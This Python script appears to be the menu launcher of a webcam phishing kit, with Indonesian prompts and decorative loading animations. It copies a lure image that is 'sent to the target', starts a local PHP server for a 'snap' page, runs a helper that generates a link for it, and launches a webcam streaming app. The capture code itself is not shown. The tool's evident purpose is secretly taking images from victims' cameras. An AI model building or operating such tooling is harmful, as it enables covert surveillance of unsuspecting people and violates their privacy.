import os
import time
import shutil
import subprocess
import requests
import banner

WHITE_BG = '\033[107m'
BLACK = '\033[30m'
RESET = '\033[0m'
WHITE = '\033[97m'
RED_BG = '\033[41m'
ORANGE_BG = '\033[48;5;202m'
BLACK_BG = '\033[40m'
CYAN_BLUE_BG = '\033[46m'

def print_typing(text):
    for char in text:
        print(BLACK + CYAN_BLUE_BG + char, end='', flush=True)
        time.sleep(0.05)
    print(RESET)

def blink_effect(frames, repeat=3):
    for _ in range(repeat):
        for frame in frames:
            os.system('clear')
            print(frame)
            time.sleep(0.1)

def loading_bar(length):
    for i in range(length):
        time.sleep(0.05)
        print("██", end="", flush=True)
    print()

def main():
    bar1_length = 1
    bar2_length = 5
    bar3_length = 6

    blink_effect([
        "▓▓",
        ""
    ])

    loading_bar(bar1_length)
    loading_bar(bar2_length)
    print("System Loading")
    loading_bar(bar3_length)

    frames = [
        "██\n██████████\nSystem Loading\n████████████",
        "",
        "██\n██████████\n█████████████\n████████████"
    ]

    blink_effect(frames, repeat=3)

def move_file():
    '''print("▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")'''
    print(ORANGE_BG + WHITE + " ≡ Pilih Opsi           " + RESET)
    print("▒" + WHITE + RED_BG + " 1 " + BLACK + WHITE_BG + " Kustomisasi Gambar " + RESET)
    print("▒" +WHITE + RED_BG + " 2 " + BLACK + WHITE_BG + " Webcam Snap        " + RESET)
    print("▒" +WHITE + RED_BG + " 3 " + BLACK + WHITE_BG + " Webcam Stream      " + RESET)
    print("▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print_typing("▒" + " Masukkan pilihan: ")

    move_file = input()

    if move_file == '1':
        custom_image()
    elif move_file == '2':
        webcam_snap()
    elif move_file == '3':
        webcam_stream()
    else:
        print_typing(BLACK + WHITE_BG + "[-] Pilihan tidak valid." + RESET)

def custom_image():
    source_file = input(BLACK + WHITE_BG + "[+] Masukkan lokasi file gambar yang ingin dikirim ke target: " + RESET)
    target_path1 = os.path.abspath(os.curdir)
    target_path2 = os.path.abspath(os.curdir)

    target_file1 = os.path.join(target_path1, 'snap/original.jpg')
    target_file2 = os.path.join(target_path2, 'stream/original.jpg')

    shutil.copy(source_file, target_file1)
    shutil.copy(source_file, target_file2)

    print_typing("File gambar berhasil dimodifikasi")

def webcam_snap():
    port = input(BLACK + WHITE_BG + " ⎔ Masukkan nomor port untuk PHP server: " + RESET)
    with subprocess.Popen(['php', '-S', f'localhost:{port}', '-t', 'snap'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) as process:
        server_url = f"http://localhost:{port}"
        time.sleep(5)
        try:
            response = requests.get(server_url)
            if response.status_code == 200:
                print_typing(" ⎔ Server PHP berhasil dijalankan pada port " + port)
                subprocess.run(['python3', 'getlink.py', port])
            else:
                print_typing(" ⎔ Server PHP gagal dijalankan pada port " + port)
        except requests.exceptions.RequestException:
            print_typing(" Server PHP gagal dijalankan pada port " + port)

def webcam_stream():
    stream_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'stream')
    app_path = os.path.join(stream_dir, 'app.py')
    subprocess.run(['python3', app_path])

if __name__ == "__main__":
    main()
    os.system('clear')
    banner.display_random_banner()
    print(RESET)
    print(BLACK + WHITE_BG + "   ᴄᴛ" + BLACK_BG + WHITE + "OS" + RESET)
    print(RESET)
    print(" ᶜᵗᴼˢ ᵃᵘᵗʰᵒʳᶦᶻᵉᵈ ᵈᵉᵛᶦᶜᵉ ")
    move_file()

